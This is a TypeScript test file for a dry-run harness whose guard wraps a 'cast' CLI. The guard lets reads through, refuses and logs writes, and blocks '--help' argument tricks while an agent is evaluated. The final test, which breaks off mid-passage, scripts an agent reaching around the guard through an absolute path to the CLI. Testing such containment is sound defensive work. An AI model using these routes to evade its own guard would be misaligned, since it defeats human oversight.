// The prompt dry run harness and its guard `cast`, run as subprocesses with no
// network, no keychain and no model: a fake real `cast` and a fake `claude`
// stand in for both. Covers the served-read cassette (docs/architecture/evals-home.md 2.6)
// and the harness's --model, --call and --max-output-tokens contract.
import { afterAll, describe, expect, setDefaultTimeout, test } from "bun:test";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { loggedArgv, servedReadKey } from "../../evals/src/served.ts";
import { replayCwd } from "../src/lineReplay.ts";

const GUARD = path.join(import.meta.dir, "prompt-dry-run-bin", "cast");
const HARNESS = path.join(import.meta.dir, "prompt-dry-run.ts");
// Every test spawns bash and a fake CLI; on a loaded machine one spawn can take a second.
setDefaultTimeout(30_000);
const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "dry-run-guard-"));
afterAll(() => fs.rmSync(tmpRoot, { recursive: true, force: true }));

function write(file: string, text: string, mode?: number) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, text);
  if (mode) fs.chmodSync(file, mode);
}

/** A stand-in for `cast agent-context --json`: each entry is a path, whether it
 *  runs something bare, and its aliases. Subcommands are derived from the paths. */
type TreeEntry = [path: string, runsBare: boolean | undefined, aliases?: string[]];
function agentContext(entries: TreeEntry[]) {
  const commands = entries.map(([command, runsBare, aliases]) => ({
    command,
    path: command.split(" "),
    aliases: aliases ?? [],
    subcommands: entries.map(([c]) => c).filter((c) => c.startsWith(`${command} `) && c.split(" ").length === command.split(" ").length + 1),
    ...(runsBare === undefined ? {} : { runsBare }),
  }));
  return JSON.stringify({ schemaVersion: 1, version: "9.9.9", commandCount: commands.length, commands });
}

/** A tree shaped like the CLI's: pure groups, groups that run something bare
 *  (sync's own action, hosts's default ls), leaves, and an alias. */
const TREE: TreeEntry[] = [
  ["org", false], ["org ls", true], ["org review", true], ["org propose", true],
  ["task", false], ["task ls", true], ["task create", true],
  ["workspace", false, ["ws"]], ["workspace ls", true],
  ["pr", false], ["pr comment", true], ["pr merge", true], ["pr review", true],
  ["chat", false], ["chat send", true], ["chat mark-read", true],
  ["sync", true], ["sync status", true],
  ["hosts", true], ["hosts ls", true],
  ["send", true], ["decide", true], ["state", true],
  ["brief", true], ["brief edit", true], ["call", true],
];

/** A run dir, a serve dir and a fake real `cast` that answers `LIVE <argv>`,
 *  answers `agent-context --json` from `tree`, and records every argv it gets. */
function world(serve: { files?: Record<string, string>; frozen?: string[]; tree?: TreeEntry[] } = {}) {
  const dir = fs.mkdtempSync(path.join(tmpRoot, "w-"));
  const runDir = path.join(dir, "run");
  const serveDir = path.join(dir, "serve");
  const fakeBin = path.join(dir, "bin");
  const realCalls = path.join(dir, "real-calls");
  const tree = path.join(dir, "agent-context.json");
  fs.mkdirSync(runDir, { recursive: true });
  fs.mkdirSync(serveDir, { recursive: true });
  write(tree, agentContext(serve.tree ?? TREE));
  write(path.join(fakeBin, "cast"), [
    "#!/usr/bin/env bash",
    `printf '%s\\n' "$*" >> "${realCalls}"`,
    `[ "$*" = "agent-context --json" ] && { cat "${tree}"; exit 0; }`,
    'echo "LIVE $* dir=${CODECAST_DIR:-}"',
    "",
  ].join("\n"), 0o755);
  for (const [name, text] of Object.entries(serve.files ?? {})) write(path.join(serveDir, name), text);
  if (serve.frozen) write(path.join(serveDir, "frozen"), serve.frozen.join("\n") + "\n");
  const cast = (...argv: string[]) => {
    const r = Bun.spawnSync(["bash", GUARD, ...argv], {
      env: { PATH: `${fakeBin}:/usr/bin:/bin`, RUN_DIR: runDir, DRY_RUN_SERVE_DIR: serveDir, DRY_RUN_REAL_CODECAST_DIR: "/real/state", CODECAST_DIR: path.join(runDir, ".nocast") },
    });
    return { code: r.exitCode, out: r.stdout.toString(), err: r.stderr.toString() };
  };
  const log = () => fs.readFileSync(path.join(runDir, "calls.log"), "utf8");
  /** Every argv the real CLI was run with. */
  const real = () => (fs.existsSync(realCalls) ? fs.readFileSync(realCalls, "utf8").split("\n").filter(Boolean) : []);
  return { cast, log, real, runDir, serveDir, helpDir: path.join(runDir, ".cast-help") };
}

/** An argv as calls.log keeps it: an argument that is not a plain word single-quoted. */
const logged = (argv: string[]) => argv.map((a) => (/^[A-Za-z0-9_./:=@%+,-]+$/.test(a) ? a : `'${a.replace(/'/g, "'\\''")}'`)).join(" ");

describe("guard cast: served reads", () => {
  test("the two key vectors hold, and the guard files reads under the same key", () => {
    expect(servedReadKey(["brief"])).toBe("5aade2e80f5dd74f765b32cf20b9954d5283af5331c34e0ad909d8a609cecbcf");
    expect(servedReadKey(["org", "review", "--team", "T"])).toBe("c3c8e1815ea12c65ef7b12528037651900c290fc2fe246959cf0beb491c3b04a");
    const w = world({
      files: {
        [`reads/${servedReadKey(["brief"])}.out`]: "the brief\n",
        [`reads/${servedReadKey(["org", "review", "--team", "T"])}.out`]: "the review prompt\n",
      },
    });
    expect(w.cast("brief").out).toBe("the brief\n");
    expect(w.cast("org", "review", "--team", "T").out).toBe("the review prompt\n");
  });

  test("the legacy org files are served", () => {
    const w = world({ files: { "org-inputs.json": '{"inputs":1}', "org-health.json": '{"health":1}', "org-ls.json": '{"ls":1}' } });
    expect(w.cast("org", "inputs", "--team", "T", "--json")).toMatchObject({ code: 0, out: '{"inputs":1}' });
    expect(w.cast("org", "health", "--json").out).toBe('{"health":1}');
    expect(w.cast("org", "ls", "--json").out).toBe('{"ls":1}');
    expect(w.cast("org", "proposals").out).toBe("No open proposals.\n");
    expect(w.log()).toContain("SERVED org inputs --team T --json");
  });

  test("a captured proposals listing is served, and --withdraw is never served, even under a prefix", () => {
    const argv = ["org", "proposals"];
    const w = world({ files: { [`reads/${servedReadKey(argv)}.out`]: "  op-41 Filings\n", [`reads/${servedReadKey(argv)}.prefix`]: argv.map((a) => `${a}\x1f`).join("") } });
    expect(w.cast("org", "proposals").out).toBe("  op-41 Filings\n");
    expect(w.cast("org", "proposals", "--json").out).toBe("  op-41 Filings\n");
    expect(w.cast("org", "proposals", "--withdraw", "op-41").code).not.toBe(0);
    expect(w.log()).not.toContain("SERVED org proposals --withdraw");
  });

  test("a captured read is served with its exit code", () => {
    const argv = ["sessions", "--json"];
    const w = world({ files: { [`reads/${servedReadKey(argv)}.out`]: "[]\n", [`reads/${servedReadKey(argv)}.exit`]: "3\n" } });
    expect(w.cast(...argv)).toMatchObject({ code: 3, out: "[]\n" });
    expect(w.log()).toContain("SERVED sessions --json");
  });

  test("a frozen read that was not captured is refused and logged UNSERVED", () => {
    const w = world({ frozen: ["brief", "trigger show"] });
    const r = w.cast("brief", "--since", "1d");
    expect(r.code).toBe(1);
    expect(r.out).toBe("");
    expect(r.err).toContain("dry run: 'cast brief --since 1d' is frozen for this replay and was not captured");
    expect(w.log()).toContain("UNSERVED brief --since 1d");
    expect(w.cast("trigger", "show", "tr-1").code).toBe(1);
    expect(w.log()).toContain("UNSERVED trigger show tr-1");
    // Only the frozen pair: a sibling read under the same first word stays live.
    expect(w.cast("trigger", "ls").out).toBe("LIVE trigger ls dir=/real/state\n");
  });

  test("a read nothing froze goes to the real cast with the real state dir", () => {
    const w = world({ frozen: ["brief"] });
    const r = w.cast("read", "jx7abcd", "1:5");
    expect(r).toMatchObject({ code: 0, out: "LIVE read jx7abcd 1:5 dir=/real/state\n" });
    expect(w.log()).toContain("LIVE read jx7abcd 1:5");
    // What the live workspace answered is kept under the served-read key, so the run shows what it saw.
    const kept = path.join(w.runDir, "live-reads", servedReadKey(["read", "jx7abcd", "1:5"]));
    expect(fs.readFileSync(`${kept}.out`, "utf8")).toBe(r.out);
    expect(fs.readFileSync(`${kept}.exit`, "utf8")).toBe("0\n");
  });

  test("org review is a read without --spawn and refused with it", () => {
    const w = world();
    expect(w.cast("org", "review", "--team", "T").out).toBe("LIVE org review --team T dir=/real/state\n");
    const r = w.cast("org", "review", "--team", "T", "--spawn");
    expect(r.code).toBe(1);
    expect(r.out).toBe("");
    expect(w.log()).toContain("REFUSED org review --team T --spawn");
  });

  test("decide show and ls are reads; any other decide posts and is refused", () => {
    const w = world();
    expect(w.cast("decide", "show", "sd-5").out).toBe("LIVE decide show sd-5 dir=/real/state\n");
    expect(w.cast("decide", "ls").out).toBe("LIVE decide ls dir=/real/state\n");
    for (const argv of [["decide", "Ship it?"], ["decide", "Ship it?", "-o", "Yes"], ["decide", "recommend", "sd-5", "1"]]) {
      expect(w.cast(...argv).code).toBe(1);
      expect(w.log()).toContain(`REFUSED ${logged(argv)}`);
    }
  });

  test("stack show and ls are reads; any other stack verb writes and never reaches the real CLI", () => {
    const w = world();
    expect(w.cast("stack", "show", "ds-5").out).toBe("LIVE stack show ds-5 dir=/real/state\n");
    expect(w.cast("stack", "ls").out).toBe("LIVE stack ls dir=/real/state\n");
    for (const argv of [["stack", "create", "Billing"], ["stack", "add", "ds-5", "sd-9"], ["stack", "policy", "ds-5", "--due", "tomorrow"]]) {
      expect(w.cast(...argv).code).toBe(1);
      expect(w.log()).not.toContain(`LIVE ${argv.join(" ")}`);
    }
  });

  test("goals, plan replay and a published page's reads go live; publish writes are refused", () => {
    const w = world();
    for (const argv of [["goals", "--brief"], ["plan", "replay", "pl-4"], ["publish", "ls", "--json"], ["publish", "comments", "pg"]]) {
      expect(w.cast(...argv).out).toBe(`LIVE ${argv.join(" ")} dir=/real/state\n`);
    }
    for (const argv of [["publish", "report.html"], ["publish", "comments", "pg", "--resolve", "c1"], ["publish", "comments", "pg", "--resolve=c1"], ["publish", "comments", "pg", "--resolve-all"], ["publish", "rm", "pg"]]) {
      expect(w.cast(...argv).code).toBe(1);
      expect(w.log()).not.toContain(`LIVE ${argv.join(" ")}`);
    }
  });

  test("a session read goes live, --ask included (a question answered from the transcript changes nothing); read --ack marks it read and is refused unless the world served it", () => {
    const w = world({ tree: [...TREE, ["read", true]] });
    expect(w.cast("read", "jx7abcd", "--full").out).toBe("LIVE read jx7abcd --full dir=/real/state\n");
    expect(w.cast("read", "jx7abcd", "--ask", "what landed?").out).toBe("LIVE read jx7abcd --ask what landed? dir=/real/state\n");
    expect(w.cast("read", "jx7abcd", "--ask=what landed?").code).toBe(0);
    for (const argv of [["read", "jx7abcd", "--ack"], ["read", "jx7abcd", "--ack=true"]]) {
      const r = w.cast(...argv);
      expect(r.code).toBe(1);
      expect(r.err).toContain("read the session without it");
      expect(w.log()).toContain(`REFUSED ${logged(argv)}`);
    }
    expect(w.real().filter((a) => a !== "agent-context --json")).toEqual(["read jx7abcd --full", "read jx7abcd --ask what landed?", "read jx7abcd --ask=what landed?"]);
    // A synthetic world's prefix record still answers --ask with the transcript it holds.
    const prefixed = ["read", "jx7abcd"];
    const k = servedReadKey(prefixed);
    const served = world({ files: { [`reads/${k}.out`]: "the transcript\n", [`reads/${k}.prefix`]: prefixed.map((a) => `${a}\x1f`).join("") } });
    expect(served.cast("read", "jx7abcd", "--ask", "what landed?")).toMatchObject({ code: 0, out: "the transcript\n" });
    expect(served.real()).toEqual([]);
  });

  test("calls.log keeps every argument's boundaries, so a logged line splits back into the argv and classifies the same", () => {
    const w = world();
    const argv = ["decide", "show which plan ships", "-o", "it's", "", 'a"b'];
    w.cast(...argv);
    expect(w.log()).toContain(`REFUSED decide 'show which plan ships' -o 'it'\\''s' '' 'a"b'\n`);
    const line = w.log().split("\n").find((l) => l.startsWith("REFUSED "))!.slice("REFUSED ".length);
    expect(loggedArgv(line)).toEqual(argv);
    expect(line).toBe(logged(argv));
    const classify = (...a: string[]) => Bun.spawnSync(["bash", GUARD, ...a], { env: { PATH: "/usr/bin:/bin", DRY_RUN_CLASSIFY: "1" } }).stdout.toString().trim();
    // Split back, it is still the write it was; the space-joined line the guard used to log read its question as `decide show`.
    expect(classify(...loggedArgv(line)!)).toBe("write");
    expect(classify(...argv.join(" ").split(" ").filter(Boolean))).toBe("read");
  });

  test("DRY_RUN_CLASSIFY answers read or write and logs and runs nothing", () => {
    const w = world();
    const classify = (...argv: string[]) => {
      const r = Bun.spawnSync(["bash", GUARD, ...argv], { env: { PATH: "/usr/bin:/bin", RUN_DIR: w.runDir, DRY_RUN_CLASSIFY: "1", DRY_RUN_SERVE_DIR: w.serveDir } });
      return r.stdout.toString().trim();
    };
    expect(classify("goals", "--brief")).toBe("read");
    expect(classify("org", "inputs", "--team", "T")).toBe("read");
    expect(classify("brief", "edit", "-")).toBe("write");
    expect(classify("task", "create", "x")).toBe("write");
    for (const argv of [["events", "resolve", "g1"], ["events", "ignore", "g1"], ["metrics", "add", "m"], ["metrics", "rm", "w1"], ["metrics", "backfill"]]) expect(classify(...argv)).toBe("write");
    expect(classify("plan", "replay", "pl-4")).toBe("read");
    for (const group of ["task", "trigger", "doc", "org"]) expect(classify(group, "replay", "x")).toBe("write");
    expect(classify("publish", "comments", "pg", "--resolve=c1")).toBe("write");
    expect(classify("read", "jx7abcd")).toBe("read");
    expect(classify("read", "jx7abcd", "--ack")).toBe("write");
    expect(classify("read", "jx7abcd", "--ask", "x")).toBe("read");
    // The trial's cards and spend are a read; its verbs start runs, record spend or rebuild cards.
    expect(classify("line", "trial", "--project", "AgentWatch Trial", "--json")).toBe("read");
    expect(classify("line", "trial")).toBe("read");
    for (const verb of ["run", "dispatch", "spend", "recard"]) expect(classify("line", "trial", verb, "x")).toBe("write");
    // What a connected product lets codecast read is a read; a connector's own verbs run actions.
    expect(classify("connector", "readers", "union")).toBe("read");
    expect(classify("connector", "resolve", "union", "x")).toBe("write");
    // Workflow runs and templates are listed; starting or re-asking a run writes.
    for (const verb of ["runs", "list"]) expect(classify("workflow", verb)).toBe("read");
    for (const verb of ["run", "reask"]) expect(classify("workflow", verb, "x")).toBe("write");
    // The report page kit and the CLI's guides print; a bare decide still posts.
    expect(classify("decide", "kit", "page.html")).toBe("read");
    expect(classify("guide", "visual")).toBe("read");
    expect(classify("decide", "Ship it?", "-o", "Ship")).toBe("write");
    expect(fs.existsSync(path.join(w.runDir, "calls.log"))).toBe(false);
    expect(w.real()).toEqual([]);
  });

  test("brief and call reads go live; brief edit, call hold and call snap write and are refused", () => {
    const w = world();
    for (const argv of [["brief"], ["brief", "@chief-of-staff", "--json"], ["call", "cl-42"], ["call", "cl-42", "15:25", "--transcript"]]) {
      expect(w.cast(...argv).out).toBe(`LIVE ${argv.join(" ")} dir=/real/state\n`);
    }
    const writes = [
      ["brief", "edit", "-"], ["brief", "--team", "Codecast", "edit", "-"], ["brief", "edit", "--for", "@chief-of-staff", "-"],
      ["call", "hold", "3m"], ["call", "--for", "jx7abcd", "hold", "off"], ["call", "snap", "cl-42:15"],
    ];
    for (const argv of writes) {
      expect(w.cast(...argv).code).toBe(1);
      expect(w.log()).toContain(`REFUSED ${logged(argv)}`);
    }
    expect(w.real().filter((a) => a !== "agent-context --json")).toHaveLength(4);
    // Every check here is a guard spawn, about two seconds each at a load of 500.
  }, 120_000);

  test("pr, chat, trigger history, events and metrics reads go live; their writes are refused", () => {
    const w = world();
    for (const argv of [["pr", "ls"], ["pr", "show", "12"], ["pr", "events", "12"], ["pr", "threads", "12"], ["chat", "read", "--channel", "c1"], ["chat", "thread", "m1"], ["chat", "channels"], ["trigger", "log", "tr-1"], ["trigger", "history", "tr-1"], ["events", "groups", "--status", "open"], ["events", "ls", "--since", "7d"], ["events", "show", "g1"], ["metrics", "ls"], ["metrics", "show", "w1"]]) {
      expect(w.cast(...argv).out).toBe(`LIVE ${argv.join(" ")} dir=/real/state\n`);
    }
    for (const argv of [["pr", "comment", "12", "hi"], ["pr", "merge", "12"], ["pr", "review", "12", "--approve"], ["chat", "send", "hi"], ["chat", "mark-read"]]) {
      expect(w.cast(...argv).code).toBe(1);
      expect(w.log()).toContain(`REFUSED ${logged(argv)}`);
    }
  }, 120_000);

  test("a word a pure command group has no subcommand for is answered as commander does, logged UNKNOWN, and run nowhere", () => {
    const w = world();
    const r = w.cast("org", "roles", "--team", "T");
    expect(r).toMatchObject({ code: 1, out: "", err: "error: unknown command 'roles'\nRun 'cast org --help' for the list of commands.\n" });
    expect(w.log()).toContain("UNKNOWN org roles --team T");
    // An alias resolves to its group: `ws frob` is unknown under workspace.
    expect(w.cast("ws", "frob").err).toContain("error: unknown command 'frob'\nRun 'cast workspace --help'");
    expect(w.log()).toContain("UNKNOWN ws frob");
    // The real CLI was asked for its tree, once, and never ran these words.
    expect(w.real()).toEqual(["agent-context --json"]);
  });

  test("a word the CLI has no command for at all is UNKNOWN too: the root runs nothing for it", () => {
    const w = world();
    expect(w.cast("ct", "show", "ct-1")).toMatchObject({ code: 1, out: "", err: "error: unknown command 'ct'\nRun 'cast --help' for the list of commands.\n" });
    expect(w.log()).toContain("UNKNOWN ct show ct-1");
    w.cast("pl");
    expect(w.log()).toContain("UNKNOWN pl\n");
    expect(w.real()).toEqual(["agent-context --json"]);
  });

  test("a group that runs something bare takes the word: cast sync <word> would upload, so it is REFUSED", () => {
    const w = world();
    for (const argv of [["sync", "foo"], ["hosts", "foo"], ["send", "jx7abc", "hi"], ["decide", "yes"], ["task", "create", "X"]]) {
      expect(w.cast(...argv)).toMatchObject({ code: 1, out: "" });
      expect(w.log()).toContain(`REFUSED ${logged(argv)}`);
    }
    expect(w.log()).not.toContain("UNKNOWN");
    // Nothing but the tree read reached the real CLI.
    expect(w.real()).toEqual(["agent-context --json"]);
  });

  test("a tree without runsBare, from an older CLI, finds nothing unknown: the call is refused", () => {
    const w = world({ tree: TREE.map(([c, , aliases]): TreeEntry => [c, undefined, aliases]) });
    w.cast("org", "roles");
    w.cast("ct", "show");
    expect(w.log()).toContain("REFUSED org roles");
    expect(w.log()).toContain("REFUSED ct show");
    expect(w.log()).not.toContain("UNKNOWN");
  });

  test("a pure group's help word is commander's help command", () => {
    const w = world();
    expect(w.cast("org", "help").out).toBe(`LIVE org --help dir=${w.helpDir}\n`);
    expect(w.log()).toContain("HELP org help");
  });

  test("--help prints the CLI's own text under a state dir of its own, never frozen or refused", () => {
    const w = world({ frozen: ["*"] });
    const helpDir = w.helpDir;
    expect(w.cast("org", "--help")).toMatchObject({ code: 0, out: `LIVE org --help dir=${helpDir}\n` });
    expect(w.cast("task", "create", "--help").out).toBe(`LIVE task create --help dir=${helpDir}\n`);
    expect(w.cast("--help").out).toBe(`LIVE --help dir=${helpDir}\n`);
    expect(w.log()).toContain("HELP org --help");
    expect(w.log()).not.toContain("REFUSED");
    expect(w.log()).not.toContain("UNSERVED");
  });

  test("a --help commander would read as an option's value reaches only help, never the action or the real state", () => {
    const w = world();
    const helpDir = w.helpDir;
    // `-d --help`: commander takes --help as the description and would run create.
    expect(w.cast("task", "create", "X", "-d", "--help").out).toBe(`LIVE task create --help dir=${helpDir}\n`);
    // `--thread --help "text"`: commander takes --help as the thread and would post.
    expect(w.cast("chat", "send", "--channel", "C", "--thread", "--help", "text").out).toBe(`LIVE chat send --help dir=${helpDir}\n`);
    expect(w.cast("decide", "Ship it?", "--help").out).toBe(`LIVE decide --help dir=${helpDir}\n`);
    expect(w.log()).not.toContain("/real/state");
  });

  test("a --help after -- is an operand, not help: the write is refused", () => {
    const w = world();
    const r = w.cast("send", "jx7abcd", "--", "--help");
    expect(r).toMatchObject({ code: 1, out: "" });
    expect(w.log()).toContain("REFUSED send jx7abcd -- --help");
    expect(w.log()).not.toContain("HELP");
  });

  test("a * line freezes every read, so a world answers from its record or not at all", () => {
    const w = world({ frozen: ["*"], files: { [`reads/${servedReadKey(["brief"])}.out`]: "the brief\n" } });
    expect(w.cast("brief").out).toBe("the brief\n");
    for (const argv of [["plan", "show", "pl-31"], ["trigger", "ls"], ["read", "jx7abcd"], ["feed"]]) {
      expect(w.cast(...argv)).toMatchObject({ code: 1, out: "" });
      expect(w.log()).toContain(`UNSERVED ${argv.join(" ")}`);
    }
    expect(w.log()).not.toContain("LIVE");
    // Writes stay writes.
    w.cast("task", "create", "X");
    expect(w.log()).toContain("REFUSED task create X");
  });

  test("writes are refused and logged REFUSED, frozen or not", () => {
    const w = world({ frozen: ["org", "task"] });
    const r = w.cast("task", "create", "Something");
    expect(r.code).toBe(1);
    expect(r.err).toContain("would write, and is refused");
    expect(w.log()).toContain("REFUSED task create Something");
    // A write under a frozen verb is a write, not an uncaptured read.
    w.cast("org", "propose", "--spec", "x.json");
    expect(w.log()).toContain("REFUSED org propose --spec x.json");
    expect(w.log()).not.toContain("UNSERVED org propose");
    w.cast("send", "jx7abcd", "hi");
    w.cast("state", "--status", "done", "x");
    expect(w.log()).toContain("REFUSED send jx7abcd hi");
    expect(w.log()).toContain("REFUSED state --status done x");
  });
});

/** A fake `claude` that records how it was called and prints a canned stream. */
function harnessWorld(stream: object[]) {
  const dir = fs.mkdtempSync(path.join(tmpRoot, "h-"));
  const bin = path.join(dir, "bin");
  // Recordings and the scripted stream sit inside the run dir: a run's sandbox reads and writes nothing else under its home folder.
  const rec = path.join(dir, "run", ".rec");
  const state = path.join(dir, "state");
  fs.mkdirSync(rec, { recursive: true });
  write(path.join(bin, "claude"), [
    "#!/usr/bin/env bash",
    'printf "%s\\n" "$@" > "$FAKE_CLAUDE_REC/argv"',
    'cat > "$FAKE_CLAUDE_REC/stdin"',
    'printf "%s\\n" "${CLAUDE_CODE_MAX_OUTPUT_TOKENS:-unset}" "${CLAUDE_CODE_DISABLE_THINKING:-unset}" "${CLAUDE_CODE_OAUTH_TOKEN:-unset}" > "$FAKE_CLAUDE_REC/env"',
    // What a Bash command sees first on PATH after the user's profile shadowed it, once CLAUDE_ENV_FILE is sourced.
    '( PATH="/profile/bin:$PATH"; . "$CLAUDE_ENV_FILE"; printf "%s" "${PATH%%:*}" ) > "$FAKE_CLAUDE_REC/path-first"',
    // A command the agent runs, when the test gives one, with what it printed.
    '[ -z "${FAKE_CLAUDE_BASH:-}" ] || eval "$FAKE_CLAUDE_BASH" > "$FAKE_CLAUDE_REC/bash" 2>&1',
    'cat "$FAKE_CLAUDE_STREAM"',
    "",
  ].join("\n"), 0o755);
  // The real CLI the guard finds: answers anything, and records each argv with the state dir it ran under.
  write(path.join(bin, "cast"), [
    "#!/usr/bin/env bash",
    'printf "%s dir=%s\\n" "$*" "${CODECAST_DIR:-}" >> "$FAKE_CLAUDE_REC/real-calls"',
    'echo "LIVE $* dir=${CODECAST_DIR:-}"',
    "",
  ].join("\n"), 0o755);
  write(path.join(rec, "stream.jsonl"), stream.map((e) => JSON.stringify(e)).join("\n") + "\n");
  // `--account fake` reads its token from the state dir, so no keychain is touched.
  write(path.join(state, "cc-token-fake.env"), "CLAUDE_CODE_OAUTH_TOKEN='fake-token'\n");
  write(path.join(dir, "prompt.md"), "Reply with the word ok.");
  write(path.join(dir, "system.md"), "Answer briefly.");
  const run = (...args: string[]) => runWith({}, ...args);
  const envWith = (extra: Record<string, string>) => ({ PATH: `${bin}:${path.dirname(process.execPath)}:/usr/bin:/bin`, HOME: dir, CODECAST_DIR: state, FAKE_CLAUDE_REC: rec, FAKE_CLAUDE_STREAM: path.join(rec, "stream.jsonl"), DRY_RUN_PASS_ENV: "FAKE_CLAUDE_REC,FAKE_CLAUDE_STREAM,FAKE_CLAUDE_BASH", ...extra });
  const runWith = (extra: Record<string, string>, ...args: string[]) => {
    const r = Bun.spawnSync(["bun", HARNESS, ...args], { env: envWith(extra) });
    return { code: r.exitCode, err: r.stderr.toString() };
  };
  /** The same run, in flight alongside others. */
  const runAsync = async (extra: Record<string, string>, ...args: string[]) => {
    const p = Bun.spawn(["bun", HARNESS, ...args], { env: envWith(extra), stdout: "pipe", stderr: "pipe" });
    const [code, err] = await Promise.all([p.exited, new Response(p.stderr).text()]);
    return { code, err };
  };
  const recorded = (name: string) => (fs.existsSync(path.join(rec, name)) ? fs.readFileSync(path.join(rec, name), "utf8") : null);
  return { dir, bin, rec, state, run, runWith, runAsync, recorded, runDir: path.join(dir, "run"), prompt: path.join(dir, "prompt.md"), system: path.join(dir, "system.md") };
}

const reply = (text: string, stop: string, outputTokens: number) => [
  { type: "stream_event", event: { type: "message_start", message: { model: "m-pinned", usage: { input_tokens: 190, output_tokens: 1 } } } },
  { type: "stream_event", event: { type: "content_block_delta", index: 0, delta: { type: "text_delta", text } } },
  { type: "stream_event", event: { type: "message_delta", delta: { stop_reason: stop }, usage: { output_tokens: outputTokens } } },
  { type: "assistant", message: { content: [{ type: "text", text }] } },
];

describe("prompt-dry-run.ts", () => {
  test("without --model it exits 2 and never spawns claude", () => {
    const h = harnessWorld([]);
    const r = h.run("--run", h.runDir, "--prompt", h.prompt);
    expect(r.code).toBe(2);
    expect(r.err).toContain("--model is required: an unpinned run takes the account default and cannot be compared");
    expect(h.recorded("argv")).toBeNull();
    expect(fs.existsSync(path.join(h.runDir, "args.json"))).toBe(false);
  }, 30_000);

  test("--call refuses --then, and --system needs --call", () => {
    const h = harnessWorld([]);
    expect(h.run("--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--call", "--then", h.prompt).code).toBe(2);
    expect(h.run("--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--system", h.system).code).toBe(2);
    expect(h.recorded("argv")).toBeNull();
  }, 30_000);

  test("--call sends the prompt as the whole message with no tools, one turn and the cap in env", () => {
    const h = harnessWorld([...reply("ok", "end_turn", 2), { type: "result", result: "ok", stop_reason: "end_turn", usage: { input_tokens: 190, output_tokens: 2 }, modelUsage: { "m-pinned": {} }, is_error: false, num_turns: 1, total_cost_usd: 0.0002 }]);
    const r = h.run("--run", h.runDir, "--prompt", h.prompt, "--model", "m-pinned", "--call", "--system", h.system, "--max-output-tokens", "20", "--account", "fake");
    expect(r.code).toBe(0);
    const argv = h.recorded("argv")!.split("\n");
    expect(argv[argv.indexOf("--tools") + 1]).toBe("");
    expect(argv[argv.indexOf("--system-prompt-file") + 1]).toBe(h.system);
    expect(argv[argv.indexOf("--max-turns") + 1]).toBe("1");
    expect(argv[argv.indexOf("--model") + 1]).toBe("m-pinned");
    expect(argv).not.toContain("--allowedTools");
    expect(argv).not.toContain("--dangerously-skip-permissions");
    expect(h.recorded("stdin")).toBe("Reply with the word ok.");
    expect(h.recorded("env")).toBe("20\n1\nfake-token\n");
    expect(JSON.parse(fs.readFileSync(path.join(h.runDir, "args.json"), "utf8"))).toEqual({
      model: "m-pinned", call: true, maxOutputTokens: 20, tools: [], maxTurns: 1, serve: null, guard: path.join(import.meta.dir, "prompt-dry-run-bin"), isolation: null, claudeMd: null, seed: null, cwd: null, readOnly: false, fake: null, fakeSeed: null,
    });
    const out = JSON.parse(fs.readFileSync(path.join(h.runDir, "out.json"), "utf8"));
    expect(out).toMatchObject({ result: "ok", stop_reason: "end_turn", is_error: false });
    expect(out.resumed_past_cap).toBeUndefined();
    expect(fs.existsSync(path.join(h.runDir, ".claude"))).toBe(false);
  }, 30_000);

  test("--call without --system sends one neutral line", () => {
    const h = harnessWorld([...reply("ok", "end_turn", 2), { type: "result", result: "ok", is_error: false }]);
    expect(h.run("--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--call", "--account", "fake").code).toBe(0);
    const argv = h.recorded("argv")!.split("\n");
    expect(argv[argv.indexOf("--system-prompt") + 1]).toBe("Follow the user's instructions.");
    expect(h.recorded("env")).toBe("unset\n1\nfake-token\n");
  }, 30_000);

  test("a call cut at max_tokens reports the first reply, not claude's resumed turns", () => {
    const h = harnessWorld([
      ...reply("1\n2\n3", "max_tokens", 20),
      { type: "user", message: { content: [{ type: "text", text: "Output token limit hit. Resume directly" }] } },
      ...reply("4\n5\n6", "max_tokens", 20),
      { type: "result", result: "API Error: Claude's response exceeded the 20 output token maximum.", stop_reason: "stop_sequence", usage: { output_tokens: 40 }, modelUsage: { "m-pinned": { outputTokens: 40 } }, is_error: true, num_turns: 2, total_cost_usd: 0.001 },
    ]);
    const r = h.run("--run", h.runDir, "--prompt", h.prompt, "--model", "m-pinned", "--call", "--max-output-tokens", "20", "--account", "fake");
    expect(r.code).toBe(0);
    const out = JSON.parse(fs.readFileSync(path.join(h.runDir, "out.json"), "utf8"));
    expect(out).toMatchObject({ result: "1\n2\n3", stop_reason: "max_tokens", usage: { input_tokens: 190, output_tokens: 20 }, is_error: false, num_turns: 1, resumed_past_cap: 1, total_cost_usd: 0.001, modelUsage: { "m-pinned": { outputTokens: 40 } } });
    expect(fs.readFileSync(path.join(h.runDir, "said.txt"), "utf8")).toBe("1\n2\n3\n");
    expect(fs.readFileSync(path.join(h.runDir, "exit.txt"), "utf8")).toBe("0\n");
  }, 30_000);

  test("an agent turn opens with the briefing itself as the user message, and keeps every message in said.json", () => {
    const h = harnessWorld([
      { type: "assistant", message: { content: [{ type: "text", text: "First.\n\n────────\n\nstill first" }] } },
      { type: "assistant", message: { content: [{ type: "text", text: "Second." }] } },
      { type: "result", result: "Second.", is_error: false, num_turns: 2, total_cost_usd: 0.01 },
    ]);
    expect(h.run("--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake").code).toBe(0);
    const argv = h.recorded("argv")!.split("\n");
    expect(h.recorded("stdin")).toBe("Reply with the word ok.");
    expect(argv[argv.indexOf("-p") + 1]).toBe("--allowedTools");
    expect(argv.join(" ")).not.toContain(h.prompt);
    expect(JSON.parse(fs.readFileSync(path.join(h.runDir, "said.json"), "utf8"))).toEqual(["First.\n\n────────\n\nstill first", "Second."]);
    // The guard stays first on every Bash command even when the profile puts the real cast ahead of it.
    // The run's own copy of the guard, with its broker baked in (prompt-dry-run.ts bakeGuard).
    expect(h.recorded("path-first")).toBe(path.join(`${h.runDir}.harness`, "guard"));
  }, 30_000);

  test("a cast the agent reaches around the guard, by an absolute path with no guard on PATH, still answers from the guard", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    const main = path.join(import.meta.dir, "..", "src", "main.ts");
    const bash = `PATH=/usr/bin:/bin '${process.execPath}' '${main}' task create Something`;
